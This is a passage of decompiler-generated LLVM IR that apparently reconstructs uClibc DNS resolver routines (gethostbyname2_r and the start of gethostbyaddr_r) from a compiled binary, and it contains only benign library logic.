dec_label_pc_1001e300:                            ; preds = %dec_label_pc_1001e2dc
  store i32 4, i32* @r5, align 4
  %v0_1001e308 = load i32, i32* @r30, align 4
  store i32 %v0_1001e308, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1001e310.1216 to i32), i32* @lr, align 4
  %v0_1001e30c = call i32 @memcpy()
  %v1_1001e314 = load i32, i32* @r26, align 4
  %v2_1001e314 = add i32 %v1_1001e314, 8
  %v3_1001e314 = inttoptr i32 %v2_1001e314 to i32*
  store i32 2, i32* %v3_1001e314, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1001e31c = load i32, i32* @r26, align 4
  %v2_1001e31c = add i32 %v1_1001e31c, 12
  %v3_1001e31c = inttoptr i32 %v2_1001e31c to i32*
  store i32 4, i32* %v3_1001e31c, align 4
  %v0_1001e320 = load i32, i32* @r31, align 4
  %v1_1001e320 = load i32, i32* @r26, align 4
  %v2_1001e320 = inttoptr i32 %v1_1001e320 to i32*
  store i32 %v0_1001e320, i32* %v2_1001e320, align 4
  %v0_1001e324 = load i32, i32* @r25, align 4
  %v1_1001e324 = load i32, i32* @r26, align 4
  %v2_1001e324 = add i32 %v1_1001e324, 16
  %v3_1001e324 = inttoptr i32 %v2_1001e324 to i32*
  store i32 %v0_1001e324, i32* %v3_1001e324, align 4
  %v0_1001e328 = load i32, i32* @r21, align 4
  %v1_1001e328 = load i32, i32* @r26, align 4
  %v2_1001e328 = add i32 %v1_1001e328, 4
  %v3_1001e328 = inttoptr i32 %v2_1001e328 to i32*
  store i32 %v0_1001e328, i32* %v3_1001e328, align 4
  %v3_1001e32c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e32c, i32* @r3, align 4
  store i32 268559156, i32* @lr, align 4
  %v0_1001e330 = call i32 @free()
  store i32 %v0_1001e330, i32* %r3.global-to-local, align 4
  %v0_1001e334 = load i32, i32* @r26, align 4
  %v1_1001e334 = load i32, i32* @r20, align 4
  %v2_1001e334 = inttoptr i32 %v1_1001e334 to i32*
  store i32 %v0_1001e334, i32* %v2_1001e334, align 4
  br label %dec_label_pc_1001e340

dec_label_pc_1001e340:                            ; preds = %dec_label_pc_1001e348, %dec_label_pc_1001e18c, %dec_label_pc_1001e300
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1001e300 ], [ 2, %dec_label_pc_1001e18c ], [ 2, %dec_label_pc_1001e348 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1001e300 ], [ 1, %dec_label_pc_1001e18c ], [ 1, %dec_label_pc_1001e348 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1001e340 = load i32, i32* @r24, align 4
  %v2_1001e340 = inttoptr i32 %v1_1001e340 to i32*
  store i32 %storemerge, i32* %v2_1001e340, align 4
  br label %dec_label_pc_1001e360

dec_label_pc_1001e348:                            ; preds = %dec_label_pc_1001e2dc
  %v3_1001e348 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e348, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001e350.1217 to i32), i32* @lr, align 4
  %v0_1001e34c = call i32 @free()
  store i32 %v0_1001e34c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e340

dec_label_pc_1001e35c:                            ; preds = %dec_label_pc_1001e120, %dec_label_pc_1001e104, %dec_label_pc_1001e0f8, %dec_label_pc_1001e0e8, %dec_label_pc_1001e0d8
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e360

dec_label_pc_1001e360:                            ; preds = %dec_label_pc_1001e0bc, %dec_label_pc_1001e0b4, %dec_label_pc_1001e068, %entry, %dec_label_pc_1001e340, %dec_label_pc_1001e21c, %dec_label_pc_1001e160, %dec_label_pc_1001e35c
  store i32 %v0_1001e034, i32* %r0.global-to-local, align 4
  %v0_1001e370 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001e370

; uselistorder directives
  uselistorder i32 %v0_1001e2e4, { 1, 0 }
  uselistorder i32 %v1_1001e2b4, { 1, 0 }
  uselistorder i32 %v1_1001e2a8, { 1, 0 }
  uselistorder i32 %v2_1001e2a4, { 1, 0 }
  uselistorder i32 %v1_1001e2a0, { 1, 0 }
  uselistorder i32 %v0_1001e28c, { 1, 0 }
  uselistorder i32 %v1_1001e2a03, { 1, 0 }
  uselistorder i32 %v1_1001e268, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1001e260, { 1, 0, 2 }
  uselistorder i32 %v0_1001e1e8, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1001e12c, { 1, 0, 2 }
  uselistorder i32 %v0_1001e0e8.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1001e0d0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 20, 4, 22, 0, 5, 6, 7, 8, 9, 10, 3, 11, 13, 12, 14, 15, 16, 17, 18, 19, 2, 21, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 9, 7, 8, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1001e360, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1001e340, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001e2dc, { 1, 0 }
  uselistorder label %dec_label_pc_1001e288, { 1, 0 }
  uselistorder label %dec_label_pc_1001e0e8, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v0_1001e374 = load i32, i32* @r4, align 4
  %v3_1001e374 = icmp eq i32 %v0_1001e374, 2
  %v0_1001e378 = load i32, i32* @lr, align 4
  store i32 %v0_1001e378, i32* %r0.global-to-local, align 4
  %v0_1001e384 = load i32, i32* @r5, align 4
  %v0_1001e38c = load i32, i32* @r6, align 4
  store i32 %v0_1001e38c, i32* @r26, align 4
  %v0_1001e390 = load i32, i32* @r7, align 4
  store i32 %v0_1001e390, i32* @r30, align 4
  %v0_1001e394 = load i32, i32* @r8, align 4
  store i32 %v0_1001e394, i32* %r22.global-to-local, align 4
  %v0_1001e398 = load i32, i32* @r9, align 4
  store i32 %v0_1001e398, i32* @r27, align 4
  store i32 %arg1, i32* @r25, align 4
  br i1 %v3_1001e374, label %dec_label_pc_1001e3a4, label %dec_label_pc_1001e3c0

dec_label_pc_1001e3a4:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1001e3bc.1218 to i32), i32* @lr, align 4
  %v6_1001e3b8 = inttoptr i32 %v0_1001e38c to i32*
  %v7_1001e3b8 = call i32 @gethostbyname_r(i32 %v0_1001e384, i32* %v6_1001e3b8, i32 %v0_1001e390, i32 %v0_1001e394, i32 %v0_1001e398, i32 %v0_1001e398)
  store i32 %v7_1001e3b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e638

dec_label_pc_1001e3c0:                            ; preds = %entry
  %v3_1001e3c0 = icmp eq i32 %v0_1001e374, 10
  br i1 %v3_1001e3c0, label %dec_label_pc_1001e3c8, label %dec_label_pc_1001e620

dec_label_pc_1001e3c8:                            ; preds = %dec_label_pc_1001e3c0
  store i32 268559308, i32* @lr, align 4
  %v0_1001e3c8 = call i32 @__open_nameservers()
  store i32 %v0_1001e3c8, i32* %r3.global-to-local, align 4
  %v0_1001e3cc = load i32, i32* @r25, align 4
  %v3_1001e3cc = icmp eq i32 %v0_1001e3cc, 0
  store i32 0, i32* @r29, align 4
  %v1_1001e3d4 = load i32, i32* %r22.global-to-local, align 4
  %v2_1001e3d4 = inttoptr i32 %v1_1001e3d4 to i32*
  store i32 0, i32* %v2_1001e3d4, align 4
  br i1 %v3_1001e3cc, label %dec_label_pc_1001e620, label %dec_label_pc_1001e3dc

dec_label_pc_1001e3dc:                            ; preds = %dec_label_pc_1001e3c8
  %v0_1001e3dc = call i32 @__errno_location()
  store i32 %v0_1001e3dc, i32* %r3.global-to-local, align 4
  %v1_1001e3e4 = inttoptr i32 %v0_1001e3dc to i32*
  %v2_1001e3e4 = load i32, i32* %v1_1001e3e4, align 4
  store i32 %v2_1001e3e4, i32* @r24, align 4
  %v0_1001e3ec = load i32, i32* @r29, align 4
  store i32 %v0_1001e3ec, i32* %v1_1001e3e4, align 4
  %v0_1001e3f0 = load i32, i32* @r31, align 4
  %v0_1001e3f4 = load i32, i32* @r25, align 4
  store i32 %v0_1001e3f4, i32* %r3.global-to-local, align 4
  %v0_1001e3f8 = load i32, i32* @r26, align 4
  %v0_1001e3fc = load i32, i32* @r30, align 4
  %v0_1001e400 = load i32, i32* %r22.global-to-local, align 4
  %v0_1001e404 = load i32, i32* @r27, align 4
  store i32 268559372, i32* @lr, align 4
  %v7_1001e408 = call i32 @__get_hosts_byname_r(i32 %v0_1001e3f4, i32 10, i32 %v0_1001e3f0, i32 %v0_1001e3f8, i32 %v0_1001e3fc, i32 %v0_1001e400, i32 %v0_1001e404)
  store i32 %v7_1001e408, i32* %r3.global-to-local, align 4
  %v3_1001e40c = icmp eq i32 %v7_1001e408, 0
  br i1 %v3_1001e40c, label %dec_label_pc_1001e638, label %dec_label_pc_1001e414

dec_label_pc_1001e414:                            ; preds = %dec_label_pc_1001e3dc
  %v0_1001e414 = load i32, i32* @r27, align 4
  %v1_1001e414 = inttoptr i32 %v0_1001e414 to i32*
  %v2_1001e414 = load i32, i32* %v1_1001e414, align 4
  store i32 %v2_1001e414, i32* %r0.global-to-local, align 4
  %v3_1001e418 = icmp eq i32 %v2_1001e414, 1
  br i1 %v3_1001e418, label %dec_label_pc_1001e434, label %dec_label_pc_1001e420

dec_label_pc_1001e420:                            ; preds = %dec_label_pc_1001e414
  %v3_1001e420 = icmp eq i32 %v2_1001e414, 4
  br i1 %v3_1001e420, label %dec_label_pc_1001e454, label %dec_label_pc_1001e428

dec_label_pc_1001e428:                            ; preds = %dec_label_pc_1001e420
  %v3_1001e428 = icmp eq i32 %v2_1001e414, -1
  br i1 %v3_1001e428, label %dec_label_pc_1001e444, label %dec_label_pc_1001e638

dec_label_pc_1001e434:                            ; preds = %dec_label_pc_1001e414
  br label %dec_label_pc_1001e454

dec_label_pc_1001e444:                            ; preds = %dec_label_pc_1001e428
  %v0_1001e444 = load i32, i32* @r28, align 4
  %v1_1001e444 = inttoptr i32 %v0_1001e444 to i32*
  %v2_1001e444 = load i32, i32* %v1_1001e444, align 4
  store i32 %v2_1001e444, i32* %r0.global-to-local, align 4
  %v3_1001e448 = icmp eq i32 %v2_1001e444, 2
  br i1 %v3_1001e448, label %dec_label_pc_1001e454, label %dec_label_pc_1001e638

dec_label_pc_1001e454:                            ; preds = %dec_label_pc_1001e420, %dec_label_pc_1001e444, %dec_label_pc_1001e434
  store i32 0, i32* @r29, align 4
  %v0_1001e454 = load i32, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1001e45c = load i32, i32* @r24, align 4
  %v1_1001e45c = load i32, i32* @r28, align 4
  %v2_1001e45c = inttoptr i32 %v1_1001e45c to i32*
  store i32 %v0_1001e45c, i32* %v2_1001e45c, align 4
  %v0_1001e460 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001e460 = load i32, i32* @r27, align 4
  %v2_1001e460 = inttoptr i32 %v1_1001e460 to i32*
  store i32 %v0_1001e460, i32* %v2_1001e460, align 4
  %tmp11 = icmp ult i32 %v0_1001e454, 16
  br i1 %tmp11, label %dec_label_pc_1001e634, label %dec_label_pc_1001e468

dec_label_pc_1001e468:                            ; preds = %dec_label_pc_1001e454
  %v0_1001e468 = load i32, i32* @r30, align 4
  %v1_1001e468 = add i32 %v0_1001e468, -16
  store i32 %v1_1001e468, i32* %r0.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_1001e468, 8
  br i1 %tmp12, label %dec_label_pc_1001e634, label %dec_label_pc_1001e474

dec_label_pc_1001e474:                            ; preds = %dec_label_pc_1001e468
  %v1_1001e474 = add i32 %v0_1001e468, -24
  store i32 %v1_1001e474, i32* @r24, align 4
  %v0_1001e478 = load i32, i32* @r26, align 4
  %v1_1001e478 = add i32 %v0_1001e478, 16
  store i32 %v1_1001e478, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v3_1001e484 = inttoptr i32 %v1_1001e478 to i32*
  store i32 %v0_1001e478, i32* %v3_1001e484, align 4
  %v0_1001e488 = load i32, i32* @r28, align 4
  %v1_1001e488 = load i32, i32* @r23, align 4
  %v2_1001e488 = add i32 %v1_1001e488, 4
  %v3_1001e488 = inttoptr i32 %v2_1001e488 to i32*
  store i32 %v0_1001e488, i32* %v3_1001e488, align 4
  %tmp13 = icmp ult i32 %v1_1001e474, 256
  br i1 %tmp13, label %dec_label_pc_1001e634, label %dec_label_pc_1001e490

dec_label_pc_1001e490:                            ; preds = %dec_label_pc_1001e474
  %v0_1001e490 = load i32, i32* @r26, align 4
  %v1_1001e490 = add i32 %v0_1001e490, 24
  store i32 %v1_1001e490, i32* @r30, align 4
  %v0_1001e494 = load i32, i32* @r25, align 4
  store i32 %v0_1001e494, i32* @r4, align 4
  %v0_1001e498 = load i32, i32* @r24, align 4
  store i32 %v1_1001e490, i32* %r3.global-to-local, align 4
  store i32 268559524, i32* @lr, align 4
  %v3_1001e4a0 = call i32 @strncpy(i32 %v1_1001e490, i32 %v0_1001e494, i32 %v0_1001e498)
  %v0_1001e4a4 = load i32, i32* @r25, align 4
  store i32 %v0_1001e4a4, i32* @r4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v0_1001e4ac = load i32, i32* @r26, align 4
  store i32 %v0_1001e4ac, i32* @r5, align 4
  store i32 268559540, i32* @lr, align 4
  %v3_1001e4b0 = call i32 @inet_pton(i32 10)
  store i32 %v3_1001e4b0, i32* %r3.global-to-local, align 4
  %v3_1001e4b4 = icmp eq i32 %v3_1001e4b0, 0
  br i1 %v3_1001e4b4, label %dec_label_pc_1001e4e4, label %dec_label_pc_1001e4bc

dec_label_pc_1001e4bc:                            ; preds = %dec_label_pc_1001e490
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1001e4c4 = load i32, i32* @r31, align 4
  %v2_1001e4c4 = add i32 %v1_1001e4c4, 8
  %v3_1001e4c4 = inttoptr i32 %v2_1001e4c4 to i32*
  store i32 10, i32* %v3_1001e4c4, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v0_1001e4cc = load i32, i32* @r30, align 4
  %v1_1001e4cc = load i32, i32* @r31, align 4
  %v2_1001e4cc = inttoptr i32 %v1_1001e4cc to i32*
  store i32 %v0_1001e4cc, i32* %v2_1001e4cc, align 4
  %v0_1001e4d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001e4d0 = load i32, i32* @r31, align 4
  %v2_1001e4d0 = add i32 %v1_1001e4d0, 12
  %v3_1001e4d0 = inttoptr i32 %v2_1001e4d0 to i32*
  store i32 %v0_1001e4d0, i32* %v3_1001e4d0, align 4
  %v0_1001e4d4 = load i32, i32* @r23, align 4
  %v1_1001e4d4 = load i32, i32* @r31, align 4
  %v2_1001e4d4 = add i32 %v1_1001e4d4, 16
  %v3_1001e4d4 = inttoptr i32 %v2_1001e4d4 to i32*
  store i32 %v0_1001e4d4, i32* %v3_1001e4d4, align 4
  %v0_1001e4d8 = load i32, i32* @r31, align 4
  %v1_1001e4d8 = load i32, i32* @r22, align 4
  %v2_1001e4d8 = inttoptr i32 %v1_1001e4d8 to i32*
  store i32 %v0_1001e4d8, i32* %v2_1001e4d8, align 4
  %v0_1001e4dc = load i32, i32* @r28, align 4
  %v1_1001e4dc = load i32, i32* @r27, align 4
  %v2_1001e4dc = inttoptr i32 %v1_1001e4dc to i32*
  store i32 %v0_1001e4dc, i32* %v2_1001e4dc, align 4
  br label %dec_label_pc_1001e638

dec_label_pc_1001e4e4:                            ; preds = %dec_label_pc_1001e490
  %v0_1001e4e4 = load i32, i32* @r29, align 4
  %v3_1001e4e4 = icmp eq i32 %v0_1001e4e4, 0
  br i1 %v3_1001e4e4, label %dec_label_pc_1001e4ec, label %dec_label_pc_1001e628

dec_label_pc_1001e4ec:                            ; preds = %dec_label_pc_1001e4e4
  %v2_1001e4ec = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1001e4ec, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 40, i32* @r5, align 4
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 268559616, i32* @lr, align 4
  %v0_1001e4fc = call i32 @__GI_memset()
  store i32 %v0_1001e4fc, i32* %r3.global-to-local, align 4
  %v2_1001e504 = ptrtoint i32* %stack_var_-100 to i32
  %v2_1001e54c = ptrtoint i32* %stack_var_-104 to i32
  %v3_1001e58c = icmp eq i32 %tmp4, 5
  %v0_1001e51c.pre = load i32, i32* %r25.global-to-local, align 4
  br label %dec_label_pc_1001e500

dec_label_pc_1001e500:                            ; preds = %dec_label_pc_1001e594, %dec_label_pc_1001e4ec
  %v0_1001e51c = phi i32 [ %v0_1001e5b0, %dec_label_pc_1001e594 ], [ %v0_1001e51c.pre, %dec_label_pc_1001e4ec ]
  store i32 %v2_1001e504, i32* @r28, align 4
  store i32 %v2_1001e504, i32* %r3.global-to-local, align 4
  %v1_1001e51c = add i32 %v0_1001e51c, 1
  store i32 %v1_1001e51c, i32* %r25.global-to-local, align 4
  %v4_1001e520 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-100, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  store i32 ptrtoint (i32* @global_var_10045088.1212 to i32), i32* %r3.global-to-local, align 4
  store i32 268559660, i32* @lr, align 4
  %v1_1001e528 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  %v3_1001e530 = load i32, i32* @global_var_1004528c.1213, align 4
  store i32 %v3_1001e530, i32* @r29, align 4
  store i32 %v2_1001e504, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268559680, i32* @lr, align 4
  %v0_1001e53c = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001e544 = load i32, i32* @r29, align 4
  %v0_1001e558 = load i32, i32* @r30, align 4
  store i32 %v0_1001e558, i32* %r3.global-to-local, align 4
  store i32 268559712, i32* @lr, align 4
  %v6_1001e55c = inttoptr i32 %v0_1001e558 to i8*
  %v7_1001e55c = call i32 @__dns_lookup(i8* %v6_1001e55c, i32 28, i32 %v0_1001e544, i32 ptrtoint (i32* @global_var_1004ef04.1214 to i32), i32 %v2_1001e54c, i32 %v2_1001e4ec)
  %v0_1001e560 = load i32, i32* @r24, align 4
  %v1_1001e564 = icmp slt i32 %v7_1001e55c, 0
  %v0_1001e568 = load i32, i32* @r30, align 4
  store i32 %v0_1001e568, i32* %r3.global-to-local, align 4
  br i1 %v1_1001e564, label %dec_label_pc_1001e628, label %dec_label_pc_1001e570

dec_label_pc_1001e570:                            ; preds = %dec_label_pc_1001e500
  %v3_1001e570 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1001e570, i32* @r4, align 4
  store i32 268559736, i32* @lr, align 4
  %v3_1001e574 = call i32 @strncpy(i32 %v0_1001e568, i32 %v3_1001e570, i32 %v0_1001e560)
  %v3_1001e578 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1001e578, i32* @r3, align 4
  store i32 268559744, i32* @lr, align 4
  %v0_1001e57c = call i32 @free()
  store i32 %v0_1001e57c, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r0.global-to-local, align 4
  br i1 %v3_1001e58c, label %dec_label_pc_1001e594, label %dec_label_pc_1001e5cc

dec_label_pc_1001e594:                            ; preds = %dec_label_pc_1001e570
  %v0_1001e588 = load i32, i32* @r24, align 4
  %v0_1001e584 = load i32, i32* @r30, align 4
  store i32 %tmp3, i32* @r4, align 4
  %v3_1001e598 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1001e598, i32* %r3.global-to-local, align 4
  store i32 268559776, i32* @lr, align 4
  %v4_1001e59c = call i32 @__decode_dotted(i32 %v3_1001e598, i32 %tmp3, i32 %v0_1001e584, i32 %v0_1001e588)
  store i32 %v4_1001e59c, i32* @r29, align 4
  %v3_1001e5a4 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1001e5a4, i32* @r3, align 4
  store i32 268559788, i32* @lr, align 4
  %v0_1001e5a8 = call i32 @free()
  store i32 %v0_1001e5a8, i32* %r3.global-to-local, align 4
  %v0_1001e5ac = load i32, i32* @r29, align 4
  %v0_1001e5b0 = load i32, i32* @r25, align 4
  %v0_1001e5b4.not = icmp sgt i32 %v0_1001e5ac, -1
  %tmp14 = icmp slt i32 %v0_1001e5b0, 6
  %or.cond = and i1 %tmp14, %v0_1001e5b4.not
  br i1 %or.cond, label %dec_label_pc_1001e500, label %dec_label_pc_1001e5bc

dec_label_pc_1001e5bc:                            ; preds = %dec_label_pc_1001e594
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e5c4

dec_label_pc_1001e5c4:                            ; preds = %dec_label_pc_1001e628, %dec_label_pc_1001e5d4, %dec_label_pc_1001e5bc
  %v0_1001e5c4 = phi i32 [ 1, %dec_label_pc_1001e628 ], [ %v0_1001e5c4.pre, %dec_label_pc_1001e5d4 ], [ 3, %dec_label_pc_1001e5bc ]
  %v1_1001e5c4 = load i32, i32* @r27, align 4
  %v2_1001e5c4 = inttoptr i32 %v1_1001e5c4 to i32*
  store i32 %v0_1001e5c4, i32* %v2_1001e5c4, align 4
  br label %dec_label_pc_1001e638

dec_label_pc_1001e5cc:                            ; preds = %dec_label_pc_1001e570
  %v3_1001e5cc = icmp eq i32 %tmp4, 28
  br i1 %v3_1001e5cc, label %dec_label_pc_1001e5d4, label %dec_label_pc_1001e614

dec_label_pc_1001e5d4:                            ; preds = %dec_label_pc_1001e5cc
  store i32 16, i32* @r5, align 4
  %v0_1001e5dc = load i32, i32* @r26, align 4
  store i32 %v0_1001e5dc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1001e5e4.1219 to i32), i32* @lr, align 4
  %v0_1001e5e0 = call i32 @memcpy()
  %v1_1001e5e8 = load i32, i32* @r31, align 4
  %v2_1001e5e8 = add i32 %v1_1001e5e8, 8
  %v3_1001e5e8 = inttoptr i32 %v2_1001e5e8 to i32*
  store i32 10, i32* %v3_1001e5e8, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1001e5f0 = load i32, i32* @r31, align 4
  %v2_1001e5f0 = add i32 %v1_1001e5f0, 12
  %v3_1001e5f0 = inttoptr i32 %v2_1001e5f0 to i32*
  store i32 16, i32* %v3_1001e5f0, align 4
  %v0_1001e5f4 = load i32, i32* @r30, align 4
  %v1_1001e5f4 = load i32, i32* @r31, align 4
  %v2_1001e5f4 = inttoptr i32 %v1_1001e5f4 to i32*
  store i32 %v0_1001e5f4, i32* %v2_1001e5f4, align 4
  %v0_1001e5f8 = load i32, i32* @r23, align 4
  %v1_1001e5f8 = load i32, i32* @r31, align 4
  %v2_1001e5f8 = add i32 %v1_1001e5f8, 16
  %v3_1001e5f8 = inttoptr i32 %v2_1001e5f8 to i32*
  store i32 %v0_1001e5f8, i32* %v3_1001e5f8, align 4
  %v3_1001e5fc = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1001e5fc, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001e604.1220 to i32), i32* @lr, align 4
  %v0_1001e600 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001e60c = load i32, i32* @r31, align 4
  %v1_1001e60c = load i32, i32* @r22, align 4
  %v2_1001e60c = inttoptr i32 %v1_1001e60c to i32*
  store i32 %v0_1001e60c, i32* %v2_1001e60c, align 4
  %v0_1001e5c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e5c4

dec_label_pc_1001e614:                            ; preds = %dec_label_pc_1001e5cc
  %v3_1001e614 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1001e614, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1001e61c.1221 to i32), i32* @lr, align 4
  %v0_1001e618 = call i32 @free()
  store i32 %v0_1001e618, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e628

dec_label_pc_1001e620:                            ; preds = %dec_label_pc_1001e3c0, %dec_label_pc_1001e3c8
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e638

dec_label_pc_1001e628:                            ; preds = %dec_label_pc_1001e500, %dec_label_pc_1001e4e4, %dec_label_pc_1001e614
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e5c4

dec_label_pc_1001e634:                            ; preds = %dec_label_pc_1001e474, %dec_label_pc_1001e468, %dec_label_pc_1001e454
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e638

dec_label_pc_1001e638:                            ; preds = %dec_label_pc_1001e444, %dec_label_pc_1001e428, %dec_label_pc_1001e3dc, %dec_label_pc_1001e620, %dec_label_pc_1001e5c4, %dec_label_pc_1001e4bc, %dec_label_pc_1001e3a4, %dec_label_pc_1001e634
  store i32 %v0_1001e378, i32* %r0.global-to-local, align 4
  %v0_1001e648 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001e648

; uselistorder directives
  uselistorder i32 %v0_1001e5b0, { 1, 0 }
  uselistorder i32 %v1_1001e490, { 1, 0, 2 }
  uselistorder i32 %tmp4, { 0, 2, 1 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 23, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_1001e638, { 7, 3, 4, 5, 0, 1, 2, 6 }
  uselistorder label %dec_label_pc_1001e628, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001e620, { 1, 0 }
  uselistorder label %dec_label_pc_1001e454, { 1, 2, 0 }
}

define i32 @__GI_gethostbyaddr_r(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %v0_1001e650 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r28, align 4
  %v4_1001e658 = icmp eq i8* %arg1, null
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001e664 = load i32, i32* @r9, align 4
  store i32 %v0_1001e664, i32* %r19.global-to-local, align 4
  %v2_1001e668 = inttoptr i32 %v0_1001e664 to i32*
  store i32 0, i32* %v2_1001e668, align 4
  %v0_1001e66c = load i32, i32* @r4, align 4
  store i32 %v0_1001e66c, i32* @r27, align 4
  %v0_1001e670 = load i32, i32* @r5, align 4
  store i32 %v0_1001e670, i32* @r22, align 4
  %v0_1001e674 = load i32, i32* @r6, align 4
  store i32 %v0_1001e674, i32* @r26, align 4
  %v0_1001e678 = load i32, i32* @r7, align 4
  store i32 %v0_1001e678, i32* @r31, align 4
  %v0_1001e67c = load i32, i32* @r8, align 4
  store i32 %v0_1001e67c, i32* @r29, align 4
  %v0_1001e680 = load i32, i32* @r10, align 4
  store i32 %v0_1001e680, i32* @r25, align 4
  br i1 %v4_1001e658, label %dec_label_pc_1001e94c, label %dec_label_pc_1001e688

dec_label_pc_1001e688:                            ; preds = %entry
  %v2_1001e688 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_1001e688, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 40, i32* @r5, align 4
  store i32 268560024, i32* @lr, align 4
  %v0_1001e694 = call i32 @__GI_memset()
  store i32 %v0_1001e694, i32* %r3.global-to-local, align 4
  %v0_1001e698 = load i32, i32* @r22, align 4
  %v3_1001e698 = icmp eq i32 %v0_1001e698, 2
  br i1 %v3_1001e698, label %dec_label_pc_1001e6ac, label %dec_label_pc_1001e6a0

dec_label_pc_1001e6a0:                            ; preds = %dec_label_pc_1001e688
  %v3_1001e6a0 = icmp eq i32 %v0_1001e698, 10
  br i1 %v3_1001e6a0, label %dec_label_pc_1001e6b8, label %dec_label_pc_1001e94c

dec_label_pc_1001e6ac:                            ; preds = %dec_label_pc_1001e688
